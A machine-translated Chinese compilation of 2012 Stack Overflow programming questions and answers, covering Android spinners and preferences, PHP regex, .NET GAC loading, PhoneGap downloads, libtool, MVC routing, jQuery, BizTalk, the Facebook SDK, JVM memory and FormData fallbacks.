设置 `setOnItemSelectedListener`为您的微调器...

```
spinner.setOnItemSelectedListener(new OnItemSelectedListener() {

            @Override
            public void onItemSelected(AdapterView<?> parent, View view,
                    int position, long id) {

                    Object obj = (Object) parent.getSelectedItem();
            //get clicked position from position    
            }

            @Override
            public void onNothingSelected(AdapterView<?> arg0) {

            //this method is call when nothing choosed by you   

            }
        }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:51:15.433

添加一个`OnItemSelectedListener`到您的`Spinner`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:52:17.480

我不确定我是否正确理解了你的问题，但让我试着回答一下。正常且直接的方法是将[OnItemSelectedListener](http://developer.android.com/reference/android/widget/AdapterView.OnItemSelectedListener.html)添加到微调器，即

```
spinner.setOnItemSelectedListener(new OnItemSelectedListener(){
    public void onItemSelected(AdapterView<?> parent, View view, int pos, long id) {
        // Do whatever you want here    
    }

    public void onNothingSelected(AdapterView parent) {
        // Do nothing.
    }
}); 
```

但这是一件如此基本的事情，我觉得指出它是个傻瓜。无论如何[，这里](http://developer.android.com/resources/tutorials/views/hello-spinner.html)是来自 Android 开发人员资源的微调器教程。它在第 5 步创建侦听器，并在第 6 步将其添加到微调器。

# php - 正则表达式 &align:%HORIZONTAL%|%VERTICAL%

> ID：10514528
> 
> 赞同：1
> 
> 时间：2012-05-09T10:47:43.467
> 
> 标签：php, regex

我想要一个匹配这样的正则表达式：

```
&align:%HORIZONTAL%|%VERTICAL% 
```

%HORIZONTAL% 可能是“左”或“右”或“中心”

%VERTICAL% 可能是“顶部”或“底部”或“中心”

我试过这样的事情：

```
&align:(left|right|center)\|(top|bottom|center) 
```

我得到了这个：

```
Array(
[0] => &align:left|center
[1] => left
[2] => top
) 
```

我必须改变什么才能只获得一场比赛？[1] 和 [2] 一定不可能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T14:46:09.797

括号有两个用途——分组和捕获。要在不捕获匹配项的情况下获得所需的分组，请使用`?:`：

```
&align:(?:left|right|center)\|(?:top|bottom|center) 
```

手册参考：[http ://uk3.php.net/manual/en/regexp.reference.subpatterns.php](http://uk3.php.net/manual/en/regexp.reference.subpatterns.php)

# c# - 无论.Net Framework如何，我们如何从GAC访问二进制文件

> ID：10514530
> 
> 赞同：-1
> 
> 时间：2012-05-09T10:47:44.577
> 
> 标签：c#, .net, gac

最初，我们正在开发 .Net Framework 3.5。因此 GAC 路径在代码中被硬编码为

```
C:\Windows\assembly\GAC_64\{0}\1.0.0.0__008145f79b9aec14\{0}.dll 
```

后来我们迁移到 .Net Framework 4.0。现在所需的路径应该是

```
C:\Windows\Microsoft.NET\assembly\GAC_64\{0}\v4.0_1.0.0.0__008145f79b9aec14\{0}.dll 
```

目前可以通过将第二条路径放入我的代码中来解决问题。但是当微软发布下一组框架时，它可能会失败。

所以我想知道是否有任何方法可以独立于.Net Framework 访问 GAC 二进制文件。

对此的任何评论都会有所帮助。谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:54:31.350

如果要从 GAC[加载程序集，请使用其完全限定名称加载它](http://msdn.microsoft.com/en-us/library/ky3942xh.aspx)：

```
Assembly.Load("SampleAssembly, Version=1.0.2004.0, Culture=neutral, PublicKeyToken=8744b20f8da049e3"); 
```

如果在 GAC 中找到它，它将从那里加载。

您**永远不**应该在任何地方硬编码 GAC 的路径。它可能随时发生变化，甚至在服务包或补丁之间也是如此，而且它是一个您不能依赖的实现细节。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:57:44.690

**不要对它们进行硬编码**

我猜你不需要在 GAC 中使用它的路径加载程序集（这会有一个很大的*原因*）所以也许你必须*手动*检查二进制文件而不加载它（例如列出可用的程序集或检查他们的元数据）。

如果您需要访问 GAC，请不要依赖路径，这对您来说将是地狱（Windows 目录更改，GAC 结构并非微不足道，有效路径取决于环境、程序集类型等）。

有一个非托管 API 可以使用：[在 MSDN 上查看此处以](http://msdn.microsoft.com/en-us/library/ms404523.aspx)供参考。例如，要获取 GAC 的路径，您可以编写：

```
GetCachePath(ASM_CACHE_GAC, pPath, MAX_PATH); 
```

# javascript - 下载文件错误 2，FileTransferError.INVALID_URL_ERR

> ID：10514533
> 
> 赞同：6
> 
> 时间：2012-05-09T10:47:52.920
> 
> 标签：javascript, xcode, cordova, http-response-codes

我正在使用 Phonegap[cordova 1.7.0] 通过 Xcode[ios5] 下载文件。这是我用来下载文件的代码：

```
 function downloadfile(){
   var fileTransfer = new FileTransfer();
   console.log('the type of root is:');
   fileTransfer.download(
                  "http://184.172.195.202:90/ElmNoor/Documents/1.txt",
                  persistent_root.fullPath,
                  function(entry) {
                  alert("I'm Downloading");
                  console.log("download complete: " + entry.fullPath);
                  },
                  function(error) {
                  alert("I'm not downloading");
                  console.log("download error source " + error.source);
                  console.log("download error target " + error.target);
                  console.log("upload error code " + error.code);
                  }
                  );} 
```

但我得到**错误代码 2** & 我不知道我能解决它吗？

这是我的日志：

```
 HelloPhoneGap[933:13403] File Transfer Finished with response code 200
     HelloPhoneGap[933:13403] [INFO] download error source http://184.172.195.202:90/ElmNoor/Documents/1.txt
     HelloPhoneGap[933:13403] [INFO] download error target /Users/weekend/Library/Application Support/iPhone Simulator/5.1/Applications/A7883F4B-7678-    4424-A93A-77747297A11E/Documents
     HelloPhoneGap[933:13403] [INFO] upload error code 2 
```

我更改了网址，但它给出了同样的错误。你知道出了什么问题吗？

**PS：我知道问题并在下面添加了答案=）**

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T12:33:31.750

如果有人遇到同样的问题，这里是答案：

要下载文件，您不应该只添加将要下载的文件夹的路径，还应该添加文件本身的路径。

因此，如果您将 jpg 图像下载到“文档”，则文件路径应为：“文档”+“.jpg”。

这是修改后的代码：

```
 function DownloadFile(){
   var fileTransfer = new FileTransfer();
   var url ="http://www.ranafrog.org.au/f006.jpg";
   var folderpath=persistent_root.fullPath+"frog.jpg"; //The path is added here.
   var onSuccess= function(entry){
   console.log("download complete: " + entry.fullPath);
};

var onError=function(error) {
    console.log("download error source " + error.source);
    console.log("download error target " + error.target);
    console.log("upload error code " + error.code);
};

fileTransfer.download(url,folderpath,onSuccess,onError);
} 
```

我不确定我所说的是否 100% 正确，但这对我有用 ,,, 所以希望它有所帮助 =)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T05:58:03.183

这个错误说的是 - 你有一个`FileTransferError.INVALID_URL_ERR`错误。这意味着您尝试保存下载文件的路径不正确。

通过将路径输出到`console`.

PS：您可以通过在普通浏览器中尝试验证您下载的URL是否正确。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-11T03:06:27.207

对不起，我弄错了，错误码2应该是INVALID_URL_ERR； 所以，你可以尝试一个普通的url（不是90端口而是80端口）进行测试，

"http://184.172.195.202/ElmNoor/Documents/1.txt", persistent_root.fullPath + "/" + "1.txt", //注意，必须加

应该可以正常下载了。

# c++ - Libtool 仅创建静态库 - 我需要共享对象

> ID：10514535
> 
> 赞同：6
> 
> 时间：2012-05-09T10:48:02.430
> 
> 标签：c++, linux, autotools, automake, libtool

我有几个 C++ 类，我想使用 autotools 和 libtool 将它们编译成一个共享库。这些是我的 configure.ac 和 Makefile.am 文件：

配置.ac：

```
AC_PREREQ(2.67)
AC_INIT(somelib.so, 1.0, someone@somewhere.com)
AC_LANG(C++)
AM_INIT_AUTOMAKE(somelib, 1.0)

LT_INIT([disable-static])
AM_DISABLE_STATIC
AM_PROG_LIBTOOL
AC_LIBTOOL_DLOPEN
AC_PROG_LIBTOOL

AC_CONFIG_SRCDIR([Logger.cpp])
AC_CONFIG_HEADER([config.h])

# Checks for programs.
AC_PROG_CXX
AC_PROG_CC

AC_SUBST(LIBTOOL_DEPS)
AC_LTDL_DLLIB
AC_PROG_RANLIB

AC_SUBST(LIBTOOL_DEPS)
AC_LTDL_DLLIB

# Checks for libraries.

# Checks for header files.
AC_HEADER_STDC
AC_CHECK_HEADERS([cstring unistd.h pthread.h])

# Checks for typedefs, structures, and compiler characteristics.
AC_HEADER_STDBOOL
AC_C_CONST
AC_C_INLINE
AC_TYPE_SIZE_T

# Checks for library functions.
AC_FUNC_MALLOC
AC_FUNC_REALLOC
AC_TYPE_SIGNAL
AC_CHECK_FUNCS([mkdir strdup dup2])
AC_CHECK_LIB(pthread, pthread_create, [], [ echo "ERROR!: libpthread not found!"; exit -1], [])
AC_CHECK_LIB(xml2, htmlReadMemory, [], [ echo "ERROR!: libxml2 not found!"; exit -1], [])

AC_CONFIG_MACRO_DIR([m4])
AC_OUTPUT(Makefile) 
```

生成文件.am：

```
AUTOMAKE_OPTIONS = foreign

ACLOCAL_AMFLAGS = -I m4
CPPFLAGS = `xml2-config --cflags` -g -fPIC -Wall -O2
AM_LDFLAGS = `xml2-config --libs` -pthread -shared -L$(libdir) -L.libs -lboost_iostreams -lz -lbz2 -L/shared/hudson/arm/lib -I/shared/hudson/arm/include

LIBVER=1:0:0

lib_LTLIBRARIES = somelib.la
somelib_la_SOURCES = <sources go here>

somelib_la_LDFLAGS = -version-info $(LIBVER)

library_includedir=$(includedir)/os
library_include_HEADERS = <headers go here> 
```

Libtool 只创建静态库，尽管我调用 configure --disable-static --enable-shared 来明确指示脚本创建共享对象。我的文件有什么问题？

- - 编辑 - -

来自 libtool 的链接 cmd：

```
/bin/bash ./libtool --tag=CXX   --mode=link arm-cortex_a8-linux-gnueabi-g++  -g -O2 -version-info 1:0:0  -o somelib.la -rpath /usr/local/lib AutoMutex.lo IniParser.lo Logger.lo Mutex.lo ProcInfo.lo Timer.lo XmlDocContainer.lo XmlNode.lo XmlParser.lo XmlSchemaValidator.lo XmlTree.lo ByteArray.lo IXmlEngine.lo LoggerSetup.lo Process.lo Thread.lo Utils.lo XmlError.lo XmlObjectEngine.lo XmlSchemaEngine.lo XmlSimpleEngine.lo Unziper.lo MUTool.lo  -lxml2 -lpthread -ldl -ldl
libtool: link: arm-cortex_a8-linux-gnueabi-ar cru .libs/somelib.a  AutoMutex.o IniParser.o Logger.o Mutex.o ProcInfo.o Timer.o XmlDocContainer.o XmlNode.o XmlParser.o XmlSchemaValidator.o XmlTree.o ByteArray.o IXmlEngine.o LoggerSetup.o Process.o Thread.o Utils.o XmlError.o XmlObjectEngine.o XmlSchemaEngine.o XmlSimpleEngine.o Unziper.o MUTool.o
libtool: link: arm-cortex_a8-linux-gnueabi-ranlib .libs/somelib.a
libtool: link: ( cd ".libs" && rm -f "somelib.la" && ln -s "../somelib.la" "somelib.la" )
make[1]: Leaving directory `/home/bg/workspace/git/somelib/src' 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T15:34:37.880

If libtool somehow believes it's on a platform that doesn't support shared libraries, it simply ignores you and builds static libraries instead. I see you're cross-compiling, perhaps libtool doesn't know how to build shared libraries for the target platform.

You'll want to check your `configure` output for a line that says something like

> checking whether to build shared libraries...no

and then read `config.log` to find out why.

# symfony - 在另一个内部使用 EntityRepository 是否有效？

> ID：10514536
> 
> 赞同：1
> 
> 时间：2012-05-09T10:48:07.830
> 
> 标签：symfony, datamapper, anemic-domain-model

例如，考虑 Jobeet 教程中的首页：

类 CategoriesRepository 扩展 EntityRepository {

```
 public function getWithJobs($limit)
  {
    $categories = $this->getContainingJobs();
    $jobsRepo = $this->em->getRepository("JobeetBundle:Jobs");
    foreach($categories as $c) {
      $c->setActiveJobs($jobsRepo->getActiveJobsByCategory($c->id, $limit);
    }
   return $categories;
  } 
```

}

所以在控制器内部，我不必使用服务层来使用两个存储库。

有人可以给我任何建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T12:05:02.083

如果您定义了类别和工作之间的关联，则不必调用另一个存储库。您可以通过在 DQL 查询中加入已经设置的相关工作来获得类别实体......

这是此案例的官方文档：http: [//symfony.com/doc/current/book/doctrine.html#joining-to-related-records](http://symfony.com/doc/current/book/doctrine.html#joining-to-related-records)

来自此文档的示例：

```
// src/Acme/StoreBundle/Repository/ProductRepository.php

public function findOneByIdJoinedToCategory($id)
{
    $query = $this->getEntityManager()
        ->createQuery('
            SELECT p, c FROM AcmeStoreBundle:Product p
            JOIN p.category c
            WHERE p.id = :id'
        )->setParameter('id', $id);

    try {
        return $query->getSingleResult();
    } catch (\Doctrine\ORM\NoResultException $e) {
        return null;
    }
} 
```

# flash - Flash - 停止动画循环

> ID：10514538
> 
> 赞同：0
> 
> 时间：2012-05-09T10:48:14.280
> 
> 标签：flash, animation, actionscript, actionscript-2, banner

我有一个 Flash 横幅，当您翻转其父级时，我需要一些元素在其上设置动画，然后停止，然后在您推出时运行不同的动画。只要用户表现自己，这就可以正常工作，但是如果您晃动鼠标，以便快速连续地进行几次翻转/滚动，它将使动画陷入无限循环。有没有其他人遇到过这个问题？

我的动作脚本是：

```
on (rollOver) {
    //frames 2 - 10 are the "turn on" animation
    this.gotoAndPlay(2);
    //frames 11 - 25 are house_three's "turn on" animation
    _root.house_three.gotoAndPlay(11);
}
on (rollOut) {
    //frames 11 - end are the "turn off" animation
    this.gotoAndPlay(11);
    //frames 26 - end are house_three's "turn off" animation
    _root.house_three.gotoAndPlay(26);
} 
```

house_three（在这种情况下）在第 10、25`stop();`帧和最后一帧上有 s，而当前对象在第 1、10 和最后一帧上有`stop();`s，所以无论如何它都不应该播放过去。

我认为这可能与许多动画实例排队有关，但这会使动画运行多次然后停止（对吗？），但它似乎无限运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T15:41:39.900

尝试在你的 rollOver 和 rollOut 中设置一个测试，看看横幅当前是否正在播放。如果是，请停止它，然后播放。

```
if(this.isPlaying)
{
    this.stop();
    this.gotoAndPlay(2)
} 
```

# android - android共享首选项实现

> ID：10514547
> 
> 赞同：0
> 
> 时间：2012-05-09T10:48:54.897
> 
> 标签：android, listview, preferences

嗨，我试图实现一个共享偏好，但我尝试的一切似乎都不起作用。我希望当有人单击列表视图中的项目时，它将有关该选择的数据存储在共享首选项中。当应用程序加载时，我希望它检查共享偏好，即：如果没有偏好，则转到此活动，否则转到另一个活动。我也想知道当我被发送到另一个活动时是否有一些偏好如何检索它们。这不是我第一次问这个问题，但我想我会再问，因为我不是很清楚

这是我到目前为止所尝试的

```
protected void onListItemClick (ListView l, View v, int position, long id) { 
        Intent intent = new Intent(this, HomeActivity.class);
        try {
            Log.v("lc", "try1");
            JSONObject singleTeamDictionary = teamNamesArray.getJSONObject(position);

            Log.v("lc", "dictionary:" + singleTeamDictionary);

            Log.v("lc", "try2");
             ChosenTeam = (String) singleTeamDictionary.get("name");
             ChosenTeamId = (String) singleTeamDictionary.get("team_id");
             ChosenLeagueId = (String) singleTeamDictionary.get("league_id");
             ChosenDivisionID = (String) singleTeamDictionary.get("division_id");

             Log.v("lc", "try3");

             Log.v("lc", "ChosenTeam: " + ChosenTeam);
             Log.v("lc", "ChosenTeamId: " + ChosenTeamId);
             Log.v("lc", "ChosenLeagueId: " + ChosenLeagueId);
             Log.v("lc", "ChosenDivisionID: " + ChosenDivisionID);          

        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            Log.v("lc", "catch");

        }

        String curPos = Integer.toString(position);
    Log.v("lc", "teamPos: " + curPos);

    SharedPreferences preferences = getSharedPreferences("prefs", Context.MODE_PRIVATE);
    SharedPreferences.Editor editor = preferences.edit();
    editor.putString("ChosenMethod", "Team");
    editor.putString("ChosenTeam", ChosenTeam);
    editor.putString("ChosenTeamId", ChosenTeamId);
    editor.putString("ChosenLeagueId", ChosenLeagueId);
    editor.putString("ChosenDivisionID", ChosenDivisionID);
    editor.commit();

        //or just use the position:
        intent.putExtra("itemIndex", curPos);
        intent.putExtra("fullData", fulldata); //or just the part you want
        startActivity(intent);
    } 
```

然后在介绍活动中

```
public void checkPreferences(){

    SharedPreferences preferences = getSharedPreferences("prefs", Context.MODE_PRIVATE);

    String ChosenMethod = preferences.getString("chosenTeam", ChosenTeam);

    //String ChosenMethod = preferences.getString("ChosenMethod", null);
//getPWDFromSP()

    //SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
     //Log.v("myapp", "prefs = " + preferences);
     //String ChosenMethod = preferences.getString("ChosenMethod", chosenMethod);
     Log.v("myapp", "ChosenMethod = " + ChosenMethod);

     if (ChosenMethod != null){

         Intent intent = new Intent(TheEvoStikLeagueActivity.this,Activity.class);

     }

}

            @Override

            public void onCreate(Bundle icicle) {

                    super.onCreate(icicle);

                    setContentView(R.layout.main);
                    checkPreferences(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:51:55.017

“chosenTeam”与“ChosenTeam”不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:02:08.333

希望这段代码可以帮助你

```
private SharedPreferences sp;
private Editor e;

//create methods
//save method(string)
private void savePreferences(String key,String val){
    sp = getSharedPreferences("prefs", 0);
    e = sp.edit();
    e.putString(key , val);
    e.commit();
}

//get method
private String getPreferences(String key){
    sp = getSharedPreferences("prefs", 0);
    String value = sp.getString(key, "");
    return value;
}

//save String
savePreferences("yourKey","yourString");

//get Preferences
getPreferences("yourKey")

//check value saved or not
if(getPreferences("yourKey").equals(null)){
   //do something
   Log.i("value","null");
}
else{
   //do something
   Log.i("value","exists");
} 
```

如果要保存整数或布尔值，可以编辑方法并根据需要返回值。

# asp.net-mvc-routing - 当默认路由和自定义路由引用同一个控制器时，MVC 路由不起作用

> ID：10514549
> 
> 赞同：0
> 
> 时间：2012-05-09T10:49:15.063
> 
> 标签：asp.net-mvc-routing

我的 global.asax 中有两个路由器，一个是默认路由器，如下所示：

```
routes.MapRoute(
                "Default", // Route name
                "{controller}/{action}/{id}", 
                new { controller = "Test", action = "Action1", id = UrlParameter.Optional } 
            ); 
```

另一个是自定义路由器：

```
routes.MapRoute(
        "CustomRouter", // Route name
        "Test/{id}/{FacetString}/{CurrPageNo}", 
        new { controller = "Test", action = "Action12", id = "", FacetString = UrlParameter.Optional, CurrPageNo=UrlParameter.Optional } 
```

);

一些当我通过 url "http://localhost/Test/1001/State=TX" 时，第二个路由器应该被执行，但有些它没有执行。我已经读过路由器的顺序很重要，因此我尝试在那里交换顺序，但它仍然不起作用，如果我将它放在默认路由器之上，那么该路由器中的所有其他操作都会调用自定义路由器，这不应该发生

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:18:16.910

似乎您应该使用**约束**，降低自定义路由器的匹配率。您可以使用第四个参数来定义您的约束。在这种情况下，它可能是这样的

```
 routes.MapRoute(
    "CustomRouter", // Route name
    "Test/{id}/{FacetString}/{CurrPageNo}", 
    new { controller = "Test", action = "Action12", id = "", FacetString =    UrlParameter.Optional, CurrPageNo=UrlParameter.Optional
 , new {id=@"\d+"}); 
```

这样，您的第二个 URL 部分必须是数字才能执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:51:58.480

根据您的第二条路线，您的网址应采用以下格式之一

```
http://localhost/Test/1001

http://localhost/Test/1001/State

http://localhost/Test/1001/State/3 
```

也不需要，`controller = "Test", action = "Action12"`因为它们不是第二条路线定义的一部分

看看这个[关于 ASP.NET 路由的 MSDN 链接](http://msdn.microsoft.com/en-us/library/cc668201.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:53:04.803

最后一个 URL 组件`State=TX`对我来说就像一个查询字符串参数。不应该是`?State=TX`（这与您的路线不匹配）或`/State/TX`

# jquery - 仅在特定窗口宽度之上切换动画

> ID：10514554
> 
> 赞同：0
> 
> 时间：2012-05-09T10:49:33.913
> 
> 标签：jquery, resize, toggle, jsfiddle

我想使用 Toggle-Event，但仅当窗口大于某个大小时。DIV 应该一直可见。我的解决方案很有效，但是一旦我调整窗口大小，if 语句就不再触发。

有什么提示吗？这是链接：http: [//jsfiddle.net/mihaene/wMrjc/](http://jsfiddle.net/mihaene/wMrjc/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T21:16:25.163

好的，假设我已经解决了您的问题，我只是发布了我的解决方案：http: [//jsfiddle.net/5bxLS/](http://jsfiddle.net/5bxLS/)

```
var toggleOn = false;
var toggleState = 0;
function slideIn() {
     toggleState = 1;
     $("#slider").stop().animate({bottom: "-20px"}, 300);
};
function slideOut() {
    toggleState = 0;
    $("#slider").stop().animate({bottom: "-180px"}, 300) ;
};
function setToggle() {
    if(!toggleOn) {
        $('#slider').toggle(slideIn, slideOut);
        toggleOn = true;
    }
};
function clearToggle() {
    if(toggleOn) {
        if(toggleState === 1)
            $('#slider').click();        
        $('#slider').off('click');   
        toggleOn = false;
    }
};
function evalToggle() {
    if ($(window).width() > 500)
        setToggle();
    else
        clearToggle();
};
    //Apparently this does not work in webkit based browsers...
/*$(window).resize(evalToggle);
evalToggle();*/
    //But this works:
    $(window).resize(evalToggle).resize(); 
```

为了停止切换，您必须取消绑定事件（在本例中为单击事件）。单击事件也是执行切换的事件。我以一种可以在开始时启用切换的方式构建我的解决方案（取决于窗口大小）。此外，如果窗口变小，切换状态设置为打开，我已经进行了平滑过渡。希望这是您正在寻找的那个！

# biztalk - BizTalk 2010 阻止属性架构的输出

> ID：10514555
> 
> 赞同：0
> 
> 时间：2012-05-09T10:49:38.547
> 
> 标签：biztalk, biztalk-2010

我有一个编排，它从 XmlDocument 类型的消息框中接收消息。这些消息已经提升了属性，我在我的项目中包含了属性模式，以便我可以过滤它们（一个单独的应用程序正在创建这些消息）。然后，我通过标准消息分配形状将未键入的消息分配给键入的消息（我没有更改名称空间），例如

```
MsgAgressoNewStarters = MsgXmldoc; 
```

然后我将消息输出到文件位置。但是，当我这样做时，也会输出属性模式。

我怎样才能防止这种情况？我试过过滤器等。

谢谢

2012 年 5 月 10 日

我想我可能会以错误的方式解决这个问题，也许如果我描述完整的场景，你可能会发现我故意的错误；）

我们正在使用 BizTalk 2010。

我有一个 BizTalk 应用程序，它与从我们的一个系统返回报告的第 3 方通用 Web 服务对话。该应用程序通过预定适配器激活，该适配器发送一个 XML 文档，其中包含两个值，即报告名称和它所针对的接口。Web 服务将报告作为单个 XML 节点上的字符串返回，该字符串本身就是一个 XML 文档。然后，我将此字符串加载到 System.Xml.XmlDocument 类型的消息中。无法从数据的格式中得知该消息用于什么报告或用于什么接口。我需要将此消息发送到消息框，以供任意数量的相关 biztalk 应用程序接收。到目前为止，我已经尝试使用两个值（来自属性模式）创建一个相关集，并将其用作发送形状上的初始化相关集。然后，我在另一个 BT 应用程序上使用了相同的属性模式来过滤消息。这可行，但由于某种原因，我收到两条消息，一条是活动编排的 XML，该编排具有与属性架构和相关集相同的字段。BizTalk 似乎无法区分它们之间的区别，尽管它们在结构上有所不同，这就是我的问题开始的地方。

我现在正在考虑在报表应用程序中创建一个多部分消息，一部分是 XmlDocument，另一部分是带有我希望路由的值的标题。

希望这有某种意义。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-11T11:09:17.850

我现在实际上已经回答了我自己的问题，因为这两个消息具有相同的属性，我无意中订阅了两个消息，d'oh！

# facebook - Facebook Like 按钮未显示：“没有为对象注册 polyfill”

> ID：10514556
> 
> 赞同：0
> 
> 时间：2012-05-09T10:49:39.160
> 
> 标签：facebook, drupal, drupal-7, facebook-like

我一直在研究 Drupal 网站，它在一周前上线。直到今天我才注意到 Facebook 上的点赞按钮已经停止显示，一切都变得非常花哨。我正在使用此代码（由 Facebook 上的类似按钮生成器生成）：

```
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=331116490288120";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script> 
```

您可以在此处查看网站：[http](http://www.theladbible.com/) ://www.theladbible.com/ （点赞按钮位于 Twitter 按钮的左侧）。

在 Chrome 上查看我的调试器控制台时，我两次收到以下错误：

```
Uncaught Error: No polyfill registered for object 
```

我查看了 SO 上的其他帖子，但没有一个有答案，最近 Drupal 论坛上的一篇帖子显示添加语言环境有助于他们的插件，但我相信这种方法不是一个选项？

希望有人能帮忙，加油。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:59:14.317

这可能与今天引入的新错误有关：[https ://developers.facebook.com/bugs/420667497951980](https://developers.facebook.com/bugs/420667497951980)

Facebook 平台状态确认了这一点：

> **JS SDK**今天（2012 年 5 月 9 日）下午 2:42 发布
> 目前，all.js 文件在加载时抛出异常。我们现在正在努力修复。有关更多信息和更新，请订阅错误[420667497951980](https://developers.facebook.com/bugs/420667497951980)。

这也可能与该错误无关，而是与其他功能有关，如果您使用从 JS-SDK 中删除的东西，例如`FB.Data.*`（今天我已经在我的一个应用程序中修复了完全相同的问题，该应用程序在代码中具有`FB.Data.query`/`FB.Data.wait`并且该功能已弃用一段时间，刚刚从 SDK 中删除）。

# java - 我的应用程序有 128MB 堆，但使用 1.6GB 的实际 RAM。我怎样才能知道 1.4GB 的去向？

> ID：10514559
> 
> 赞同：4
> 
> 时间：2012-05-09T10:50:03.670
> 
> 标签：java, linux, memory

在 linux 平台上，我在 jboss 上的 java 应用程序有 128MB 堆，但使用 1.6GB 的实际 RAM。我怎样才能知道 1.4GB 的去向？

```
 PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  CODE DATA TIME+  COMMAND
 1379 root      16   0  9.7g 1.6g 1980 S  0.7  1.3 36  9.7g 0:11.03 java 
```

谢谢，
埃姆雷

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:51:53.030

我的第一步是检查内存分析器中的进程，例如[VisualVM](http://visualvm.java.net/features.html)或[YourKit](http://www.yourkit.com/features/index.jsp#live_memory)。这可以让您初步了解进程的内存使用情况*。*

另一个可能有助于解决此类问题的工具是[`jmap`](http://prefetch.net/blog/index.php/2007/10/27/summarizing-java-heap-utilization-with-jmap/).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:52:37.273

我不知道你怎么知道的。但我的理论是您的应用程序已将一个巨大的文件映射为`MemoryMappedBuffer`. 您问题中的统计数据表明您正在使用 9.7 GB 的地址空间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T14:45:31.383

Emre He，根据您的设置，您只设置了 perm gen start/max size。尝试将这些参数添加到您的 JVM：-Xms128m -Xmx128m

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:00:48.870

“我的应用程序有 128MB 堆”是什么意思，你是用 -Xmx 128M 启动 JBoss 吗？

无论如何，堆大小并不能确定您的进程使用的内存量，JVM 会为其他事情分配内存，包括为每个线程分配一个堆栈。

但在您的情况下，这可能不是解释，因为 1.4GB 似乎很大。你在你的应用程序中做一些特别的事情吗？

# javascript - FormData 未定义 - Firefox 3.6.28 替代

> ID：10514570
> 
> 赞同：10
> 
> 时间：2012-05-09T10:50:36.483
> 
> 标签：javascript, jquery, form-data

我不得不完成最初交给承包商但从未完成的工作。没问题，但是我现在被告知系统必须支持 Firefox 3.6！不是很好，但直到现在我都不会失眠！系统有一个 Ajax 函数，它使用 FormData 对象然后上传一个文档（通常是 PDF）。我已经通过 Firefox 3.6 运行了这个，我得到了以下信息

> "FormData 未定义"
> var formData = new FormData($('form')[0]);

没关系，因为我可以看到不支持此对象，我只需要使用不同的方法或收集方式...我使用了这个：

```
var formData = Components.classes["@mozilla.org/files/formdata;1"]
        .createInstance(Components.interfaces.nsIDOMFormData); 
```

然而，这给了我以下错误！

> [http://10.29.100.23:8080](http://10.29.100.23:8080)获取属性 XPCComponents.classes的权限被拒绝

我不确定这是为什么……路径“ `@mozilla.org/files/formdata;1`”不正确吗？我做了更多的研究，却一无所获！所以我然后想到序列化表单将以下内容更改为...

```
var formData =  {};

$.each($('form')[0].serializeArray(), function(_, kv) {
     if (formData.hasOwnProperty(kv.name)) {
         formData[kv.name] = $.makeArray(formData[kv.name]);
         formData[kv.name].push(kv.value);
     }else {
        formData[kv.name] = kv.value;
    }
}); 
```

虽然这并没有错误，但 Ajax 函数没有上传（我认为它没有识别或找到文件，或者它只是收集文件值的字符串）。有没有人对旧浏览器中的 FormData 替代品有任何建议，尤其是 Firefox 3.6 - 这是我必须支持的唯一旧浏览器。

**********更新****************

 *****这是 HTML 页面上表单的内容

```
<form action="" method="post" enctype="multipart/form-data" name="uploadForm" id="uploadForm" target="#">
    <label for="fileField">Rechnung hochladen</label>
    <input type="file" name="fileField" id="fileField">
    <progress id="progressbar" class="progressbar_margin hidden"></progress>
</form> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T12:33:08.990

[FormData](https://hacks.mozilla.org/2010/05/formdata-interface-coming-to-firefox/)是一个 XMLHttpRequest Level 2 接口，使用 XHR / Ajax 可以轻松提交表单（包括文件上传）。正如您所发现的，它仅在 Firefox 4 及以后的版本中可用。（[MDN 文档](https://developer.mozilla.org/en/DOM/XMLHttpRequest/FormData)有一个浏览器兼容性表。）

我建议尝试[jQuery Form Plugin](http://malsup.com/jquery/form/)。它支持在旧浏览器中上传文件的 iframe 后备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-11T22:38:50.797

我认为您应该在代码之前使用它：

```
netscape.security.PrivilegeManager.enablePrivilege(
    'UniversalXPConnect'
); 
```

确保也这样做：

1.  在地址栏中输入“about:config”；
2.  搜索“signed.applet.codebase_principal_support”；
3.  将值设置为 true；

希望它有效，祝你好运。*****

# android - 如何以编程方式引用 /values/strings.xml 文件中的内容？

> ID：10514574
> 
> 赞同：4
> 
> 时间：2012-05-09T10:50:58.583
> 
> 标签：android, xml, string

